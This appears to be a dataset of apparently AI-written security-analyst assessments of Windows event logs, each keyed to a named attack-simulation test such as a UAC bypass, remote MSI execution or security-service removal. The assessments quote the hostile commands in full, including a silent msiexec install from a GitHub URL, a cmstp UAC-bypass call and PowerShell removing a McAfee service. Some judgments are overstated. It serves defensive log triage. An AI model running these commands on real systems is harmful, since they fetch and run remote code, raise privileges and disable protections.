    - **Time Change Events (Event ID 4616):** There are two instances where the system time was changed within a second, as indicated by Event IDs 4616. This can be indicative of an attempt to obscure logging activity or anti-forensics effort. It is particularly concerning as it involved `svchost.exe`, a legitimate Windows process, which can be exploited by malware or unauthorized actors.
    - **Account Logoff (Event ID 4634) and Privilege Assignment (Event ID 4672):** The `admin_test` account was involved in a logoff event and seems to have multiple privileges assigned, including `SeDebugPrivilege`, which is often exploited by malicious actors to manipulate system processes and bypass security mechanisms.

2. **Sysmon Log:**
    - **Process Execution:**
        - Multiple executions of `wevtutil.exe`, `conhost.exe`, and `cmd.exe` by the user `SERVER002\admin_test` were observed. The executions of `wevtutil.exe` are significant as it is used to interact with the Windows Event Log, possibly indicating log tampering attempts.
        - Command executed via `cmd.exe`: `""cmd.exe"" /c reg add ""HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f`. This command modifies a registry setting related to Credential Security Support Provider (CredSSP), which could potentially expose the system to security vulnerabilities if set improperly.

    - **Microsoft Edge Update Activity:**
        - Numerous EdgeUpdate activities involving different EdgeUpdate executables (`MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe`) that performed updates and registrations. While this could be benign, the degree of activity should be confirmed against expected behavior for the EdgeUpdate service.

### Assessment:
The logs contain several signs of suspicious behavior:
- The system time modifications and attempts to modify registry values related to CredSSP raise concerns of potentially malicious intent aimed at obfuscating activities and facilitating unauthorized access.
- The extensive use of administrative privileges and execution of system utilities like `wevtutil.exe` can suggest attempts to manipulate system logs.
- The constant and repetitive Edge Update-related entries might mask malicious actions or reflect normal update processes; further analysis in this specific context from known baselines or recent updates is required.

### Conclusion:
The provided logs reveal activities that are suspicious and warrant further investigation. While there is no direct evidence indicating a confirmed compromise, the potential for malicious activity exists given the anomalies in temporal modifications and system utility execution.

### Resolution:
- **SUSPICIOUS**: 
   - Further investigation is needed to confirm the legitimacy of actions observed, particularly the time changes, registry modifications, use of privileges, and the frequency and context of Edge Update executions.
   - I recommend correlating these logs with additional telemetry, such as network logs or EDR alerts, to ascertain intent and potential threat actors involved.

### Recommendations:
- Verify with IT if any authorized maintenance was performed during this time.
- Examine the `admin_test` account for recent changes or misuse.
- Review the system for additional indicators of compromise, such as suspicious network traffic or other system changes.
- Increase monitoring on affected systems and accounts for unusual behavior."
Opening ports for proxy - HARDRAIN,"### Detailed Analysis of the Windows Event Logs

**1. Summary of Key Observations:**
- The logs show multiple instances of the utility `wevtutil.exe` being executed on the system (`EventID: 5`). This is a Windows command-line tool used for managing event logs and event log providers. Its persistent usage within a short time frame could indicate log tampering or reconnaissance activities.
- There are several entries related to `conhost.exe` juxtaposed with processes like `wevtutil.exe`, `HOSTNAME.EXE`, and `whoami.exe`, which may be indicative of command-line operations being orchestrated within a console window.
- The execution of `cmd.exe` to add a firewall rule (`netsh advfirewall firewall add rule`) is notable. The use of `cmd.exe` to allow a specific TCP port (450) suggests potentially unauthorized modification of firewall settings, which is often a tactic used to establish persistence or facilitate communication with malicious external entities.
- Execution of `whoami.exe` to ascertain user information on the system, typically seen in initial stages of an attack or script execution.
- A time manipulation event (`EventID: 4616`) from the Security log and corresponding Kernel-General events indicating the time was altered. Time adjustments can be a critical indicator of log tampering or attempts to confuse timeline analysis by altering timestamps.

**2. Potential Indicators of Malicious Activity:**
- **Process Execution Patterns:**
  - *Frequent use of `wevtutil.exe`* and `conhost.exe` within a similar timeframe raises suspicion.
  - *Command-line utilization of `cmd.exe` for firewall rule changes* is uncharacteristic for normal operations unless conducted by authorized personnel for a known purpose.
  
- **Time Manipulation:**
  - Possibly for obfuscating activity, making it difficult to trace actions back to an attacker within logs.

- **Network Configuration Changes:**
  - Opening a TCP port (450) without explicit authorization can be a direct security threat, potentially indicating an attempt to facilitate unauthorized access or data exfiltration.

**3. Assessment of the Situation:**
- The combination of these logs — unexpected system utilities execution, command-line interface activities, firewall changes, and timestamp alterations — gathers enough evidence that suggests a possibility of malicious behavior. This pattern aligns with tactics used in various stages of a cyber attack, including discovery, lateral movement, and persistence.

**4. Recommendation and Next Steps:**
- **Resolution: SUSPICIOUS**
  - Further investigation is necessary to identify intent, origin, and extent of these actions.
  - Perform endpoint detection and response (EDR) for deeper analysis and identification of potential malware or script execution.
  - Review user access logs and privilege use for `SERVER002\admin_test` to corroborate authorized actions versus anomalous behaviors.
  - Isolate network access to/from this node and assess system integrity.
  - Ensure logging mechanisms are intact to monitor further suspicious activities; validate time source settings to prevent unauthorized changes.
  
These steps will help in establishing whether the activities justify escalation to `MALICIOUS` or confirm them as non-threatening, possibly aligning with `BENIGN` actions after thorough validation."
ProtocolHandler.exe Downloaded a Suspicious File,"Based on the provided logs, here is a detailed analysis:

### Analysis of Logs:

#### Application Log:
- The `Application` log mainly features events concerning the ""edgeupdate"" service stopping, which by itself is not inherently suspicious.

#### Sysmon Log:
- **Significant processes and behavior:**

    1. **Microsoft Edge Update Executions:**
       - Multiple instances of `MicrosoftEdgeUpdate.exe` paths and command lines indicate that Microsoft Edge's update process was executed. These include running with various command-line arguments such as `/svc`, `/regsvc`, `/regserver`, `/update`, `/ua /installsource core`, and more. This behavior, in isolation, is typical for scheduled updates or repair operations of the software.
       - The use of installation paths and temporary directories is consistent with update or installation routines.

    2. **Script and Command Execution:**
       - **Suspicious Command (cmd.exe):** There is a highly suspicious command executed using `cmd.exe`, which references the Windows registry to query Microsoft Word application paths and appears to download a Word document from a remote GitHub URL:  
         `""cmd.exe"" /c FOR /F ""tokens=2*"" %%a in ('reg query ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe"" /V PATH') do set microsoft_wordpath=%%b & call ""%%microsoft_wordpath%%\protocolhandler.exe"" ""ms-word:nft|u|https://raw.githubusercontent.com/file/file-file/master/files/data/src/dataTest.docx""`.

       - **Utilities Usage:**
         - `Powershell.exe` is individually observed but lacks command-line arguments. However, its execution simultaneous with other activities raises concern.
         - Execution of `wevtutil.exe`, which typically manages event logs, in conjunction with the other activities, may indicate an attempt to clear or modify event logs as a means of covering tracks.
         - Frequent executions of `conhost.exe` typically are tied to command-line or console operations.

    3. **Parent-Child Relationships:**
       - Several of the suspicious commands/processes are spawned from `wsmprovhost.exe`, which is used in Windows Remote Management. This may suggest remote operations are taking place possibly unsanctioned by regular administrative operations.

#### Threat Assessment:
- The presence of potentially suspicious scripting activity involving registry queries and external URL accesses is a strong indicator of potentially malicious activity. The goal might be to exploit or install malicious payloads through document files.
- The use of remote URLs, and particularly the invoking of an untrusted domain (GitHub raw user content) for downloading a document is characteristic of phishing or remote exploitation attempts.
- Even though service updates and related processes for products like Microsoft Edge are common, the blending with the other uncertain processes and remote URL access could point towards leveraging update services for other purposes.

### Resolution:

**Resolution: MALICIOUS**

Given the suspicious use of command line to download something from an external source, and unmonitored command and utility executions close together suggests malicious activity. It indicates an attempt to execute commands or scripts in a potentially compromising manner. This needs immediate investigation and remediation.

### Next Steps:

1. **Immediate Action:**
   - Isolate the affected machine (Server002) from the network to prevent any further spread or external communication.
   - Perform a forensic investigation to verify post-compromise behavior or other compromised systems.
   
2. **Remediation Steps:**
   - Thoroughly assess for any unauthorized changes, including new files or scripts introduced on the machine.
   - Review and possibly erase unauthorized entries from the registry or changes.
   - Scan for presence of any malicious software or unintended updates, especially one involving user data collection modules.

3. **Preventive Measures:**
   - Audit access and update procedures for critical user systems, confirm source authenticity.
   - Increase monitoring for registry modifications and network interactions, especially involving external IPs and unauthorized URL accesses.
   - Conduct security awareness for key personnel on spotting and handling suspicious activities. 

By taking these measures, you mitigate and preempt further risks while understanding the potential vectors involved."
Bypass UAC using sdclt DelegateExecute,"Upon reviewing the provided event logs, several indicators point towards potentially malicious activity. Here's a detailed analysis of the logs, highlighting suspicious behaviors:

### Security Log Analysis:
1. **Event ID 4624**: A successful logon with Logon Type 5 indicates a service startup, which is generally benign by itself but needs context to determine its relevance.
2. **Event ID 4672**: Privileged account logon with elevated privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` which are commonly abused for privilege escalation or lateral movement by attackers.
3. **Event ID 4616**: Changes to the system time are logged and appear to be minor adjustments, potentially reflecting normal operations of time synchronization.

### Application Log Analysis:
1. Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), indicating that antivirus protection is enabled. However, the logs don't show any immediate threat detection.

### Windows PowerShell Log Analysis:
1. **PowerShell Events (600 series)**: Indicate execution of a PowerShell command that creates a registry key to hijack the folder shell opening command to execute `cmd.exe /c notepad.exe`. This is a known technique used for persistent backdoors. In addition, executing `sdclt.exe` could indicate an attempt to bypass UAC using the `sdclt.exe /c` command line trick, a common privilege escalation method.

### System Log Analysis:
1. No direct anomalous entries, although registry changes and time adjustments could reflect attempts to manipulate system behavior.

### Sysmon Log Analysis:
1. **Multiple Sysmon Event ID 1 and 5**: Numerous process creations such as `whoami.exe`, `hostname.exe`, and repeated executions of `wevtutil.exe` and `conhost.exe` which typically act as console windows for command-line tools. This regular spawning of command utilities could indicate scripted or automated actions.
2. The execution of `powershell.exe` with a command line focused on modifying the registry and launching `cmd.exe` is highly likely to be illegitimate.

### Indicators of Malicious Activity:
- The use of PowerShell to manipulate registry keys for persistence and attempt to launch processes with higher privileges.
- The registry modifications paired with the execution of `sdclt.exe` suggest an attempt to perform UAC bypass, which is a common tactic in malware campaigns.
- The presence of elevated privileges during these operations (as indicated by Event ID 4672) supports the hypothesis of privilege escalation attempts.

### Conclusion:
Based on the analysis of the event logs, the activity observed is highly suggestive of malicious behavior. The combination of PowerShell script execution modifying registry keys with privilege levels that facilitate persistence, as well as multiple suspicious system commands, strongly indicate malicious intent.

**Resolution**: MALICIOUS

### Recommendations:
1. **Immediate Action**: Isolate the affected machine from the network to prevent further propagation.
2. **Thorough Investigation**: Perform a detailed forensic analysis on the affected machine, including memory dumps and disk analysis to determine the full scope of the infiltration.
3. **Remediation**: Remove any unauthorized registry modifications, malicious scripts, or tools identified during forensic analysis.
4. **Enhance Monitoring**: Increase the level of monitoring on privileged accounts and PowerShell activity across the network.
5. **User Awareness**: Re-train users on identifying phishing and social engineering tactics if this is seen as a possible attack vector."
MSXSL Bypass using local files,"**Detailed Log Analysis:**

**Suspicious/Anomalous Behaviors:**

1. **Event ID 4624 and 4672:**
   - Multiple logon events using Logon Type 5, which is a service logon, specifically for the SYSTEM account. While SYSTEM logons are not uncommon, the quick succession and repetitive nature of these events (Event IDs: 4624 and 4672) in a short time frame may imply service or automated tasks being scheduled or executed possibly by malicious scripts or software.
   - The repeated usage of privileges such as `SeDebugPrivilege`, which can be used to debug or directly interact with system processes, is concerning, especially in systems infiltrations or post-exploitation phases.

2. **Event ID 5379:**
   - Numerous unsuccessful read operations on accounts like `WindowsLive` and `MicrosoftAccount`, consistently returning with error code `3221226021`. This suggests repeated attempts at accessing or verifying credentials, potentially indicating brute force or credential stuffing attempts on these service accounts.

3. **Sysmon Events:**
   - Several executions of `conhost.exe` and `wevtutil.exe` by the user `SERVER002\\admin_test`. `conhost.exe` is a legitimate Windows process, but if spawned by unusual processes like `wevtutil.exe` (which interacts with event logs), it could indicate an attempt at manipulating logs or hiding other activities.

   - The execution of various command-line tools such as `whoami.exe`, `hostname.exe`, etc., by `SERVER002\\admin_test`, suggesting enumeration activity which an attacker might perform to understand the environment they are in.

   - A notable execution of `cmd.exe` with a command involving `msxsl.exe`, which is commonly used for XSLT transformations. However, in this scenario, it could be possibly executing or transforming scripts indicating a form of code injection or execution, typical in adversary simulation or malware deployment techniques.

**Assessment of Malicious Activity:**

- The combination of repeated high-privilege logons, potentially suspicious uses of Windows utility tools (`conhost.exe`, `wevtutil.exe`), and unsuccessful access attempts to credential-type accounts suggest attempts to gain unauthorized access or escalate privileges.
- The execution of potential script commands via `cmd.exe` in conjunction with `msxsl.exe` raises red flags for possible remote code execution or script-based attacks.

**Guidance on How to Proceed:**

- Immediately conduct a thorough forensic examination of `SERVER002`, focusing on `admin_test` account activities. Ensure all critical data is backed up and investigate for payloads or additional artifacts that might have been deployed or altered during these events.
- Verify system integrity by running comprehensive security checks, including malware scans, and consider isolating the machine from the network until a clean status can be confirmed.
- Correlate these findings with network logs or any available correlation systems (SIEM) to determine if there’s lateral movement or additional nodes affected in the network.
- Consider resetting passwords for affected accounts and strengthening the authentication process (enforcing MFA) on all critical accounts.

**Final Resolution: MALICIOUS**

The combination of suspicious activities and tool executions, privilege-intensive logins, and the potential execution of non-standard command line scripts strongly indicates malicious activity. Immediate action and a comprehensive investigation are warranted to secure the environment."
CMSTP Executing UAC Bypass,"**Analysis of the Logs:**

1. **Suspicious Events:**
   - There is a process execution of `cmstp.exe` from the Windows command processor with the command: `cmd.exe /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003_uacbypass.inf"" /au`. The use of `cmstp.exe` in this manner is a known technique for User Account Control (UAC) bypass, which can be considered an indicator of potential malicious activity if not expected.

   - The suspicious `cmstp.exe` command was executed with high integrity level, suggesting it may have been used to escalate privileges.
   
2. **Malicious Indicators:**
   - The presence of potentially unwanted command-line arguments and paths (e.g., ""data.003_uacbypass.inf"") indicates possible exploitation attempts. The process spawned `wevtutil.exe` and `conhost.exe` in rapid succession, which could suggest attempts to execute a malicious script or payload.

3. **Other Notable Activity:**
   - Multiple instances of Microsoft Edge update processes (`MicrosoftEdgeUpdate.exe`) executed, including installations and updates, generally correspond to routine software updates but warrant careful scrutiny in this context due to the potential use of compromised paths.
   
4. **Security Log Insight:**
   - The logs reveal multiple logon events for the user `admin_test`, which exploited high privilege on the system (Event ID 4672). This could indicate unusual administrative activities, potentially part of a privilege escalation attempt.

5. **Overall Risks:**
   - The use of `cmstp.exe` as observed is concerning due to known UAC bypass methods, particularly when executed in a context without a well-documented and justified business need.
   - The processes had high integrity levels and involved obscure paths and naming conventions, which is suggestive of potentially tailored exploitation.

**Guidance and Resolution:**

Given the outlined observations, particularly the use of `cmstp.exe` as a UAC bypass mechanism and utilizing high integrity levels for execution, this activity is assessed as **MALICIOUS** due to the exploitative nature of command-line arguments, process execution patterns associated with privilege escalation, and potential misuse of administrative processes.

**Recommended Steps:**

1. **Immediate Containment:**
   - Isolate the affected host from the network to prevent lateral movement.

2. **In-depth Investigation:**
   - Further scrutiny on the executed `cmstp.exe` commands and audit other activities around the execution timeframe.
   - Examine the user's activities (`admin_test`) and their access across other systems.

3. **Remediation:**
   - Conduct a thorough malware scan and integrity check of the system files, focusing on potential persistence techniques.
   - Remove any identified malicious files or applications.

4. **System Hardening:**
   - Implement UAC policies to prevent exploitation via `cmstp.exe` or similar executables without proper authorization.
   - Strengthen monitoring and alerting around privileged operations and sensitive command executions.

5. **User Awareness:**
   - Educate users about risky behaviors that could lead to such compromises, and encourage reporting of unexpected behaviors. 

Proceed with incident response protocols to remediate and review defensive controls for future prevention."
Remove Network Share PowerShell,"Based on the provided Windows event logs, a detailed analysis is as follows:

### Analysis:

1. **System Log:**
   - **Time Change Events:** There are events indicating changes to the system time. These are facilitated by `svchost.exe` and contain typical references to synchronization with an NTP server (`time.windows.com`). This can be standard behavior as part of time synchronization activities and doesn't always indicate malicious intent unless seen in certain malicious scenarios where time changes cover up malicious activities. However, syncing with `time.windows.com` seems typical.

2. **Application Log:**
   - **Edge Update:** The application events indicate that services related to Microsoft Edge Update have stopped. This pattern matches typical service management during software updates and doesn't inherently indicate malicious activity.

3. **Sysmon Log:**
   - **Execution of `wevtutil.exe` and `conhost.exe`:** Observed several instances of `wevtutil.exe` and `conhost.exe` being executed by a user labeled as `SERVER002\admin_test`. `wevtutil.exe` is a legitimate Windows utility used to query event logs, but frequent and unscripted usage can sometimes hint at log tampering. However, there is no evidence suggesting such an action here.
   - **Process Creation:**
     - A suspicious usage of `powershell.exe` is noted: It's executing a potentially sensitive command - `Remove-SmbShare` and `Remove-FileShare`. This may imply a removal of network shares, which can be a legitimate operation but can also be used to disrupt operations or hide activities.
     - The commands being run from PowerShell with high integrity level are concerning. High integrity execution means the commands have elevated permissions which could lead to system modifications outside of standard operations.
   - **Microsoft Edge Update Activities:** Multiple executions of `MicrosoftEdgeUpdate.exe` are noted. They generally occur during update checks or installations; their presence multiple times isn't necessarily suspicious but can denote a legitimately running update cycle.

4. **Windows PowerShell Log:**
   - Recurrence of commands that seem to remove shared resources could imply potential cleanup or resource evacuation activities. Given the pattern of invocation, they might not be typical system maintenance or could suggest a targeted configuration change.

5. **Security Log:**
   - **Time Change by LOCAL SERVICE:** The time alterations recorded as conducted by the `LOCAL SERVICE` account using `svchost.exe` do not show strong malicious indications in isolation. They correlate with the system log time adjustments.

### Assessment:
- While most activities like `MicrosoftEdgeUpdate.exe`, and `svchost.exe` invoking time adjustments seem benign, the particular PowerShell activities involving the removal of network shares stand out as anomalous if not expected.
- Execution of `wevtutil.exe` at multiple points could correlate with event log querying or potential manipulation/tampering, though this alone, without further indicators, is not enough to classify as malicious.

### Resolution:
- **Resolution: SUSPICIOUS**
  - The usage of PowerShell with elevated rights to remove SMB shares merits further investigation to determine the intent behind these actions and whether they align with expected IT operations or an incident response scenario.
  - It is advised to follow up on these activities by comparing them against expected maintenance schedules or with the IT team responsible for server operations.

### Guidance on How to Proceed:
1. **Verify Scheduled Tasks or Administrative Actions:** Confirm with the IT department if there were scheduled tasks or IT operations that involved these PowerShell commands.
2. **Examine User Behavior:** Check if the `SERVER002\admin_test` account actions align with legitimate administrative actions.
3. **Broader Environment Check:** Review environmental changes in server configurations around the time of logs to rule out potential malicious impact.
4. **Expand Investigation:** If anomalies persist without justification, consider broader investigation measures like inspecting network traffic or user activity logs to spot additional irregularities."
Stop and Remove Arbitrary Security Windows Service,"**Detailed Analysis of Logs:**

1. **Application Logs:**
   - The logs show events for the ""edgeupdate"" service stopping twice. While stopping a service isn't inherently malicious, the repetition warrants consideration in conjunction with other logs.

2. **Security Logs:**
   - Events 4616 and 4624 indicate system time and logon details. Event 4616 showing a slight adjustment in system time is often mundane unless frequent or coinciding with suspicious activity.
   - Event 4624 represents a successful logon event of type 5 (Service), indicating a logon process by a service (SYSTEM user), which is usual for system processes.
   - Event 4672 logs special privileges assigned during a session, which is normal for system-level services (SYSTEM user).

3. **System Logs:**
   - These logs reflect typical operations like time adjustments handled by services. 
   - Windows updates (EventID: 19) look typical for regular security and system updates.

4. **Sysmon Logs:**
   - There are numerous logs indicating the execution of ""wevtutil.exe"" and ""conhost.exe"" by a user ""SERVER002\admin_test."" The repeated execution of ""wevtutil.exe"" could suggest log manipulation or querying, which deserves attention if not routine administrative activity.
   - Event logs reveal the execution of ""powershell.exe"" with commands to ""Stop-Service"" and ""Remove-Service"" for ""McAfeeDLPAgentService."" The PowerShell command's intent to stop and remove a security service is highly suspicious, typically associated with disabling security controls on a system.
   - Continuous creation of various ""MicrosoftEdgeUpdate.exe"" processes as seen in several Sysmon events looks like legitimate software updates and installations but should be verified against scheduled updates.

5. **Windows PowerShell Logs:**
   - The PowerShell commands involving ""Stop-Service"" and ""Remove-Service"" targeting a security agent (McAfee DLP Agent) suggest an attempt to tamper with security measures on the host.

**Assessment & Conclusion:**
The presence of commands removing a key security service (McAfee DLP Agent) using PowerShell, coupled with wevtutil.exe executions, points towards an attempt to disable security measures, possibly to hide malicious activities. These actions align with tactics used by attackers to establish persistence or exfiltrate data without generating alerts.

The logs exhibit behavior that is undoubtedly malicious due to the direct attempt to dismantle security defenses manually. Moreover, the activities related to wevtutil.exe, even if part of regular administrative activities, need further confirmation to clear any doubts considering the context.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected machine to prevent further unauthorized actions or data exfiltration.
- Conduct a thorough forensic examination of the system to identify the extent of the compromise and any potential backdoors.
- Verify with the user ""SERVER002\admin_test"" regarding legitimate administrative actions or scripts they may have performed.
- Review and enhance existing endpoint security measures to detect and block similar activities in the future.
- Assess and apply recommended security patches and updates to address any potential vulnerabilities.
- Implement stricter access controls and auditing for critical systems and sensitive services."
Activate Windows NoSetTaskbar Group Policy Feature,"Upon analyzing the provided Windows event logs, I have identified the following points of interest and suspicions:

### Security Log
- **Event ID 4616** is commonly associated with changes to system time. The logs show that the `svchost.exe` process was responsible for multiple slight adjustments to the system time, which can be expected behavior for synchronizing with a time server (such as `time.windows.com`).

### Application Log
- Routine events related to software protection and Microsoft's Edge Update. No suspicious entries.

### Sysmon Log
- There is repeated invocation of certain processes by the user `SERVER002\\admin_test`, which could indicate routine administrative tasks. However, one particular command stands out:
  - **cmd.exe** is executed with a command to add a registry key (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`) with the `NoSetTaskbar` value. This action modifies user interface policies, which could potentially indicate an attempt to alter user settings for malicious purposes.
  - The processes `whoami.exe` and `hostname.exe` are executed, which could be benign but may also suggest information gathering scripts typical in early stages of a breach attempt.
  - **reg.exe** processes are executed to alter registry settings, typically a red flag if not part of routine automated or administrative tasks.

### Other Logs
- The system and other logs do not contain entries that immediately suggest malicious activity. They mostly show typical kernel or system operations with no clear alterations indicative of compromise.

### Assessment
The logs show significant activity consistent with software updates and system maintenance processes, particularly regarding Microsoft Edge updates. However, the manipulation of registry settings via command prompt raises an alert. Altering user interface policies without direct correlation to a legitimate task (such as a scheduled task or a known administrative script) could indicate unauthorized changes which could disrupt user workflows or be indicative of attempted privilege escalation.

**Resolution: SUSPICIOUS**
- There is suspicious activity, specifically regarding registry modifications through the command line, which warrants further investigation. This activity does not confirm malicious intent but suggests behaviors that are irregular without accompanying documentation or scheduled tasks explaining these actions.

### Guidance
- **Further Investigation:**
  - Verify with system administrators if there were any known scripts or actions performed that required changing registry settings at the observed times.
  - Analyze any additional logs or threats around the time of these events to identify whether there is a pattern or scheduled task.
  - Conduct a deeper scan on `Server002` for any malware or unauthorized user accounts.
  
- **Preventive Measures:**
  - Implement tighter monitoring and alerting control around processes performing registry modifications.
  - Review access policies and ensure proper logging and alerting mechanisms are in place for high-integrity operations, especially involving `svchost.exe` and registry access.

The noted behavior, while suspicious, requires context which may render it benign if administrative tasks or updates were appropriately documented."
Indicator Manipulation using FSUtil,"Upon reviewing the logs provided, here are the key findings:

1. **Time Change Anomaly**: 
   - In the Security logs, there are events (Event ID 4616) indicating a backward time change on the system (`PreviousTime`: 2024-10-23 14:02:33.1878117 to `NewTime`: 2024-10-23 14:02:28.8848182). This kind of activity could potentially be an indicator of a time manipulation attempt, possibly aiming to bypass logging or audits.

2. **High Privilege Logon**: 
   - The logs show several entries for high-privilege actions associated with the user `admin_test`. Event ID 4672 indicates the assignment of multiple significant privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) to this user. While this might be legitimate for an admin account, the privileges in conjunction with other suspicious indicators warrant closer scrutiny.

3. **Unusual Script Execution**:
   - In the Sysmon and PowerShell logs, there are records of PowerShell scripts being executed by `admin_test`. The command involves writing data to a file in a temp directory and using `fsutil` to modify file data, which resembles tactics used in malicious data masking or exfiltration techniques. Specifically:
     ```plaintext
     ""powershell.exe"" & {if (-not (Test-Path \""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.txt\""\"")) { New-Item \""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.txt\""\"" -Force } , echo \""\""1234567890\""\"" > \""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.txt\""\"", fsutil file setZeroData offset=0 length=10 \""\""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\data.txt\""\""}
     ```
   - This script's behavior is atypical and could indicate data manipulation or attempted obfuscation of data changes.

4. **System and Application Activities**: 
   - The system and application logs include routine entries such as software update checks and service start/stop events. The entry of the `edgeupdate` service stopping and its related processes in the Sysmon logs do not exhibit direct signs of compromise but do provide a context for other events happening around the same timeframe.

### Assessment:
The combination of the time change anomaly, the granting of extensive privileges to `admin_test`, and the execution of suspicious PowerShell scripts on the machine suggest some degree of suspicious activity. While none of these individually make a clear indication of a known attack pattern or definitive malicious activity, together they warrant further investigation.

### Resolution:
- **SUSPICIOUS**: While the behavior recorded doesn't definitively prove malicious intent, the anomalies and script activities suggest that further investigation is needed. There is enough evidence to potentially signify a threat and justify a more in-depth look into user `admin_test` activities, the purpose of the time change, and the outcomes of the PowerShell scripts executed on the system.

### Recommended Action:
1. **Investigate User Activity**: Examine the logs for `admin_test`'s prior and subsequent activities. Check if there is an unusual pattern in behavior or access.
2. **System Integrity Check**: Verify any modifications or discrepancies in the system's time settings and review any associated impacts or potential manual interventions.
3. **PowerShell Script Analysis**: Look at the context of PowerShell script execution and verify whether these activities are expected in the operational context. Review any altered or created files for suspicious content.
4. **Monitor**: Increase monitoring of the system for further suspicious activities, especially around the noted user account and processes.
5. **Update Policies**: Review and possibly enhance password and privilege management practices to prevent any unnecessary access to high-privilege settings or accounts.

By promptly addressing and investigating these points, you can better ascertain whether these points of interest correlate with unauthorized access or configuration attempts."
Msiexec.exe - Execute Remote MSI file,"**Analysis of Windows Event Logs:**

### Suspicious or Anomalous Behavior:

1. **EDR Alert on CEO's Machine:**
   - The logs indicate unusual command-line operations that were executed on the machine, some of which appear to be suspicious and possibly related to malicious activity.
   
2. **Use of Utilities and CLI Tools:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` alongside `whoami.exe` indicates possible unauthorized manipulation or extraction of event logs or attempt to obfuscate activities.
   - Execution of `cmd.exe` with suspicious command-line input: downloading a potentially malicious MSI from a GitHub URL and attempting its installation using `msiexec.exe`. The command is executed silently (`/q`) which is commonly used in malicious activity to avoid user notification.
   
3. **PowerShell Use:**
   - `powershell.exe` is executed with command-line instructions indicating it has been used in a script or task possibly trying to avoid strong logging and invoking without profile (`-nop`). The command `Write-Host JScript executed me!; exit` suggests the PowerShell was initiated and scripted, potentially to execute a downloaded or encoded script.
   
4. **Unauthorized Installations:**
   - The logs indicate execution of `msiexec.exe` installing from a remote location, which is a common tactic used within software deployment attacks.
   - Following events show completions and interactions by the `MsiInstaller`, which are reflected in the application log, suggesting that whatever was executed completed successfully.

5. **Chain of Executions:**
   - The chain from `cmd.exe` downloading the MSI, installing it via `msiexec.exe`, and then initiating a PowerShell task aligns with patterns seen in delivery of malware payloads.

### Malicious Activity Indicators:

- **Command Line Execution:**
  ```plaintext
  ""cmd.exe"" /c c:\\windows\\system32\\msiexec.exe /q /i ""https://github.com/file/file-file/raw/master/files/data.007/bin/data.007_JScript.msi""
  ```
  The above command is highly indicative of malicious behavior as downloading and executing scripts or programs in this manner is not standard for legitimate administrative tasks, especially considering the external source and silence flag `/q`.

- **PowerShell Script Execution:**
  - Invocation via PowerShell with non-interactive session settings (`-nop`) and explicit script execution reveals potential script-based attack mechanisms like fileless malware execution.

### Conclusion and Recommendations:

**Resolution: MALICIOUS**

- The activities observed in the logs indicate a high probability of compromise through the execution of unauthorized scripts and external program installations.
- Immediate actions should include isolating the affected machine to prevent potential spread or data exfiltration.
- Further forensic analysis should be conducted to determine the impact and extent of the compromise. This includes analyzing the downloaded files, checking for persistence mechanisms, and reviewing other network-connected systems for similar activities.
- Change all credentials associated with compromised accounts `SERVER002\\admin_test` and consider resetting credentials for other potentially exposed accounts.

Additionally, user education on recognizing phishing and attacks can help prevent future incidents, alongside implementing more stringent endpoint detection and policy controls."
Hidden Window,"Based on the investigation of the provided Windows event logs, the following analysis and assessment of the situation have been conducted:

### Analysis of Logs

1. **Security Logs:**
   - EventID 4616 indicates that a time change was made on the system by the process `svchost.exe` as executed by the `LOCAL SERVICE` account. This typically represents a benign system activity related to time synchronization.

2. **Windows PowerShell Logs:**
   - The PowerShell events show an execution of `powershell.exe` with a command to start another PowerShell process using `Start-Process` with a hidden window style to execute `calc.exe` (Calculator).
   - The command-line arguments used here: `powershell.exe & {Start-Process powershell.exe -WindowStyle hidden calc.exe}` demonstrate obfuscation techniques often used to execute scripts or commands without the user's knowledge. The intention to hide the process window is particularly suspicious in a security context.

3. **Sysmon Logs:**
   - Multiple instances of `powershell.exe` process creation and subsequent `calc.exe` executions are identified. This includes the use of hidden window styles as noted in the PowerShell logs.
   - The execution of elevated privileges (High Integrity Level) and involvement of an administrative user `SERVER002\\admin_test` are noteworthy, indicating potential misuse or exploitation of power by administrative credentials.
   - Use of `wevtutil.exe` commonly used for clearing event logs which can be part of anti-forensic techniques to cover tracks of nefarious activities.
   - Multiple invocations of Windows utilities like `conhost.exe`, `hostname.exe`, and `whoami.exe` might be consistent with enumeration activities associated with reconnaissance by attackers.

4. **System and Application Logs:**
   - The System logs mainly indicate normal system activities related to time synchronization.
   - The Application log denotes routine system services' operations which do not directly point to any suspicious activity.

### Assessment of the Situation

- The usage of PowerShell to execute `calc.exe` with hidden attributes and the potential to bypass detection is indicative of covert operations.
- The execution pattern suggests an attempt to explore or manipulate the system environment under administrative rights, indicating a breach of user policies or potential lateral movement by an attacker post-compromise.
- The repeated and varying use of system utilities, potentially in combination with command-line obfuscations suggest attempts at network reconnaissance or privilege escalation.

### Threats or Risks Identified

- **Potential Malicious Activity:** The sequence of events, particularly the hidden PowerShell executions combined with utility activity and administrative access, implies a strong risk of malicious activity. The logs reveal tactics, techniques, and procedures (TTPs) consistent with those used in unauthorized access and exploitation.
- **Data or System Integrity Risk:** Given that administrative credentials are involved, it's plausible that sensitive data or system configurations have been probed or modified.

### Resolution and Guidance

- **Resolution:** **MALICIOUS**
- **Guidance:**
  1. **Immediate Action:** Isolate the affected system from the network to prevent further potential data exfiltration or network compromise.
  2. **Conduct Forensic Analysis:** Perform a thorough forensic investigation focusing on the processes highlighted in these logs to better understand the scope and methods of the attack.
